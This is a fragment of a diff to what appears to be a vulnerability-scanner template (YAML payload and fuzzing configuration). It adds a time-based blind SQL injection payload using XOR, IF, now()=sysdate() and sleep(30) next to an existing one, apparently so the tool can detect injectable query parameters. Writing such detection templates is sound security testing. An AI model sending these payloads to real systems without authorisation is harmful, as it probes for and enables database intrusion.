@@ -16,6 +16,7 @@ requests:
     payloads:
       injection:
         - '0"XOR(if(now()=sysdate(),sleep(30),0))XOR"Z'
+        - 'XOR(if(now()=sysdate(),sleep(30),0))XOR'
 
     fuzzing:
       - part: query
